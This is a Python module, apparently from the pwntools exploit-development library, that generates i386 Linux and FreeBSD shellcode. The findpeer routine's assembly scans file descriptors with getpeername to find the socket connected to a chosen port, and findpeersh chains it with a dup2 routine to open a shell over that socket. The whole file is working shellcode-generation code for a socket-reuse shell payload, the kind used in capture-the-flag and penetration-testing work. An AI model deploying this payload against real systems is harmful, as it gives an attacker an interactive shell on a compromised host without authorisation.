from pwn.internal.shellcode_helper import *
from .. import dupsh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network=['ipv4', 'ipv6'])
def findpeersh(port = None):
    """Args: port (defaults to any)
    Finds an open socket which connects to a specified
    port, and then opens a dup2 shell on it."""
    return findpeer(port), dupsh("esi")

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network=['ipv4', 'ipv6'])
def findpeer(port = None, os = None):
    """Args: port (defaults to any port)
    Finds a socket, which is connected to the specified port.
    Leaves socket in ESI."""

    if os == 'linux':
        code = """
findpeer:
    push -1
    push SYS_socketcall_getpeername
    mov ebp, esp
    pop ebx
    pop esi

.loop:
    push SYS_socketcall
    pop eax

    inc esi
    lea ecx, [esp-32]

    push 4
    pushad

    int 0x80
"""

        if port == None:
            return code + """
    test eax, eax
    popad
    pop edx
    jnz .loop
"""

        else:
            return code + """
    popad
    pop edx
    shr eax, 16
    cmp ax, 0x%04x
    jne .loop
""" % htons(int(port))

    elif os == 'freebsd':
        code = """
findpeer:
    push -1
    pop esi

    push SYS_getpeername
    pop eax

    mov ebp, esp
    pushad

.loop:
    inc esi
    pushad
    int 0x80
"""

        if port == None:
            return code + """
    test eax, eax
    popad
    jnz .loop
"""

        else:
            return code + """
    popad
    cmp word [ebp+2], 0x%04x
    jne .loop
""" % htons(int(port))

    else:
        bug('OS was neither linux nor freebsd')
